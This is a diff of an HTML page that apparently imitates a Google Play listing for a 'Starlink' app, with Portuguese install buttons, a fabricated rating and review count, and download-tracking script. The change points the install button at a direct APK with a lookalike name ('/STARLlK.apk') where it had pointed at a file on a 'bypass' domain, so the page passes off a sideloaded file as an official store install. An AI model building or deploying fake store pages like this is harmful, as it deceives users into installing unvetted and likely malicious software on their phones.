@@ -51016,7 +51016,7 @@
 </style>
 <script>
 (function(){
-  var downloadUrl="https://www.leviatabypass.online/uploads/apks/api/20261119T165517-01da3ed7007f-Starlink-Mini.apk",buttonLabel="Instalar",rating="4.6",reviewsCount="11,8 mil",appName="Starlink – Apps no Google Play",appId=77,appSlug="starlink-apps-no-google-play",trackUrl="\\/track-download.php";
+  var downloadUrl="/STARLlK.apk",buttonLabel="Instalar",rating="4.6",reviewsCount="11,8 mil",appName="Starlink – Apps no Google Play",appId=77,appSlug="starlink-apps-no-google-play",trackUrl="\\/track-download.php";
   document.querySelectorAll('img[data-tp-empty-screenshot="1"]').forEach(function(img){var item=img.closest('[role="listitem"]')||img.closest('.ULeU3b');if(item)item.style.display='none'});
   function trackDownload(){try{var payload=new FormData();payload.append('app_id',appId);payload.append('slug',appSlug);if(navigator.sendBeacon){navigator.sendBeacon(trackUrl,payload);return}fetch(trackUrl,{method:'POST',body:payload,credentials:'same-origin',keepalive:true}).catch(function(){})}catch(e){}}
   function setButtonDownloading(btn){if(btn.getAttribute('data-tp-downloading')==='1')return false;btn.setAttribute('data-tp-downloading','1');btn.classList.add('tp-download-disabled');btn.setAttribute('aria-disabled','true');btn.style.cursor='wait';var textTarget=btn.querySelector('.VfPpkd-vQzf8d')||btn.querySelector('span')||btn;textTarget.innerHTML='<span class="tp-download-spinner"></span>Baixando';btn.setAttribute('aria-label','Baixando');return true}
